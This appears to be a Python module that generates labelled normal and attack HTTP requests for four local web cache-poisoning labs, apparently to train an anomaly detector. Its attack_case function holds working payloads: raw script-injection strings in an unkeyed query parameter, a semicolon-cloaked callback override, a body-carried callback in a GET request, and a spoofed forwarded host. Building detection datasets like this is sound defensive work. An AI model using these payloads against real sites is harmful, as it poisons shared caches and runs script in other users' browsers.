"""Request templates for the four current Fusion cache-poisoning labs.

All cases target only the local training lab.  A case describes the request as
sent, plus its manually assigned class; labels are never inferred from the
response.
"""
from __future__ import annotations

from dataclasses import asdict, dataclass
from urllib.parse import quote, urlencode


LABS = ("xfh", "query", "utm", "fatget")


@dataclass(frozen=True)
class FusionCase:
    lab: str
    label: str
    attack_type: str
    payload_variant: str
    method: str
    uri: str
    headers: dict[str, str]
    body: str

    # Chiếu FusionCase thành metadata request cho extractor.
    def request_dict(self) -> dict[str, object]:
        return asdict(self)


# Tạo bộ HTTP header lành tính dùng chung.
def base_headers(user_agent: str, language: str) -> dict[str, str]:
    return {
        "Host": "127.0.0.1:8086",
        "User-Agent": user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": language,
    }


# Sinh request normal theo route với biến thiên có kiểm soát.
def normal_case(lab: str, token: str, user_agent: str, language: str,
                variant_index: int = 0, method: str = "GET") -> FusionCase:
    """Build a benign request with realistic feature diversity.

    The collector intentionally varies safe URL/query/header shapes so a
    normal-only density model can learn more than a few constant coordinates.
    It does *not* normalize unsafe primitives into benign traffic: client
    supplied forwarded-host mismatches and GET bodies remain attack-only.
    """
    headers = base_headers(user_agent, language)
    accept_values = (
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html;q=0.9,application/json;q=0.7,*/*;q=0.5",
    )
    headers["Accept"] = accept_values[variant_index % len(accept_values)]
    if lab == "xfh":
        # Collector-only normal diversity for the route-local IF.  These are
        # matching forwarded-host values, not a change to the vulnerable lab
        # or its attack primitive.  A mismatch remains attack-only.
        proxy_slot = variant_index % 20
        if proxy_slot >= 10:
            # Deliberately non-uniform legitimate proxy shapes.  Their normal
            # frequency gives the IF a route-local density axis; all values
            # still match Host exactly, so no XFH mismatch is labelled normal.
            benign_host = (
                "127.0.0.1:8086" if proxy_slot < 17 else
                "localhost:8086" if proxy_slot < 19 else
                "fusion.local:8086"
            )
            headers["Host"] = benign_host
            headers["X-Forwarded-Host"] = benign_host
        categories = ("electronics", "computers", "featured")
        params = {
            "cb": token, "category": categories[variant_index % len(categories)],
            "page": str(1 + variant_index % 5),
        }
        if variant_index % 4 == 1:
            params.update({"view": "compact", "sort": "price"})
        elif variant_index % 4 == 2:
            params.update({"q": "usb hub", "currency": "VND"})
        elif variant_index % 4 == 3:
            params.update({"campaign": "autumn sale", "limit": "24"})
        uri = "/labs/xfh/shop?" + urlencode(params)
    elif lab == "query":
        params = {
            "cb": token, "page": str(1 + variant_index % 5),
            "view": ("grid", "list")[variant_index % 2],
        }
        # Benign marketing/query shapes ensure that the unkeyed parameter
        # name, URL encoding, duplicates and harmless punctuation are not by
        # themselves treated as attacks. Values remain encoded, so they do not
        # exercise the raw HTML sink with executable syntax.
        if variant_index % 6 == 0:
            params["utm_content"] = "fusion-autumn-campaign"
        elif variant_index % 6 == 1:
            params.update({"q": "wireless mouse", "campaign": "new arrivals"})
        elif variant_index % 6 == 2:
            params.update({"note": "buyer's guide", "ref": "email"})
        elif variant_index % 6 == 3:
            uri = "/labs/query/?" + urlencode(list(params.items()) + [("tag", "computer"), ("tag", "accessory")])
            return FusionCase(lab, "normal", "normal", "benign-duplicate-tag", method, uri, headers, "")
        elif variant_index % 6 == 4:
            params.update({"utm_content": "launch sale", "layout": "cards compact"})
        else:
            params.update({"locale": "vi-VN", "coupon": "WELCOME10"})
        uri = "/labs/query/?" + urlencode(params)
    elif lab == "utm":
        callback = ("setCountryCookie", "fusionCallback" + token[:8])[variant_index % 2]
        locale = ("vi", "en")[variant_index % 2]
        if variant_index % 4 == 0:
            params = {"callback": callback, "locale": locale, "view": "compact cards"}
            uri = "/labs/utm/js/geolocate.js?" + urlencode(params)
        elif variant_index % 4 == 1:
            # Rails-style parsing treats the suffix as a benign locale field;
            # callback remains the known normal callback. This introduces a
            # harmless semicolon/query combination without invoking a hidden
            # callback gadget.
            uri = ("/labs/utm/js/geolocate.js?callback=" + callback + "&locale=" + locale
                   + "&utm_content=campaign-" + token[:8] + ";locale=en&view=compact+cards")
        elif variant_index % 4 == 2:
            params = {"callback": callback, "locale": locale, "utm_content": "buyer’s guide", "theme": "dark"}
            uri = "/labs/utm/js/geolocate.js?" + urlencode(params)
        else:
            params = {"callback": callback, "locale": locale, "utm_content": "release 2026", "campaign": "autumn sale"}
            uri = "/labs/utm/js/geolocate.js?" + urlencode(params)
    elif lab == "fatget":
        params = {
            "callback": ("setCountryCookie", "fusionCallback" + token[:8])[variant_index % 2],
            "locale": ("vi", "en")[variant_index % 2],
        }
        if variant_index % 3 == 0:
            params["view"] = "compact cards"
        elif variant_index % 3 == 1:
            params.update({"campaign": "autumn sale", "theme": "dark"})
        else:
            params.update({"region": "apac", "source": "storefront"})
        uri = "/labs/fatget/js/geolocate.js?" + urlencode(params)
    else:
        raise ValueError(f"Unsupported Fusion lab: {lab}")
    return FusionCase(lab, "normal", "normal", "benign-variant-" + str(variant_index % 6), method, uri, headers, "")


# Sinh request mang primitive tấn công tương ứng với lab.
def attack_case(lab: str, token: str, user_agent: str, language: str,
                variant_index: int = 0) -> FusionCase:
    """Return a local, non-browser attack sample for one lab family."""
    headers = base_headers(user_agent, language)
    if lab == "xfh":
        headers["X-Forwarded-Host"] = "127.0.0.1:8087"
        if variant_index % 2:
            headers["X-Forwarded-Proto"] = "https"
        uri = "/labs/xfh/shop?" + urlencode({"cb": token, "category": "electronics"})
        return FusionCase(lab, "attack", "xfh-unkeyed-header",
                          ("forwarded-host-only", "forwarded-host-with-proto")[variant_index % 2], "GET", uri, headers, "")
    if lab == "query":
        payloads = ("'/><script>alert(1)</script>", "';alert(1);//")
        # Keep the payload raw. This mirrors a Burp Repeater request target and
        # lets the response demonstrate the unsafe reflection, unlike a merely
        # percent-encoded string that a browser may not execute in this sink.
        payload = payloads[variant_index % len(payloads)]
        # Keep the keyed portion representative of an ordinary browse request.
        # It lets a clean follow-up remove only the unkeyed UTM input while
        # retaining exactly the same cache key and normal request profile.
        query = "cb=" + quote(token, safe="") + "&page=1&view=grid&utm_content=" + payload
        return FusionCase(lab, "attack", "query-unkeyed-parameter",
                          ("script-context-breakout", "javascript-string-breakout")[variant_index % 2],
                          "GET", "/labs/query/?" + query, headers, "")
    if lab == "utm":
        callback = "fusionCallback" + token[:8]
        # Deliberately leave ';' literal: Nginx treats it as UTM content while
        # the Rails-style origin parser treats it as a second callback pair.
        alert = "alert(" + str(1 + variant_index % 2) + ")"
        # Match the benign resource shape while leaving the semicolon-cloaked
        # callback as the only malicious difference.
        uri = "/labs/utm/js/geolocate.js?callback=" + callback + "&locale=vi&utm_content=fusion-" + token[:8] + ";callback=" + alert
        return FusionCase(lab, "attack", "utm-parameter-cloaking", "semicolon-hidden-callback-" + str(1 + variant_index % 2),
                          "GET", uri, headers, "")
    if lab == "fatget":
        callback = "fusionCallback" + token[:8]
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        alert = "alert(" + str(1 + variant_index % 2) + ")"
        body = "callback=" + quote(alert, safe="")
        # httpx would add this automatically on the wire. Store it explicitly
        # so the labelled request matches the metadata available to Nginx and
        # a future request-time detector can identify a GET with a body.
        headers["Content-Length"] = str(len(body.encode("utf-8")))
        # Keep the request-line parameters normally shaped; only the GET body
        # changes the callback at the intentionally vulnerable origin.
        uri = "/labs/fatget/js/geolocate.js?" + urlencode({"callback": callback, "locale": "vi"})
        return FusionCase(lab, "attack", "fat-get-body", "body-callback-override-" + str(1 + variant_index % 2), "GET", uri, headers, body)
    raise ValueError(f"Unsupported Fusion lab: {lab}")
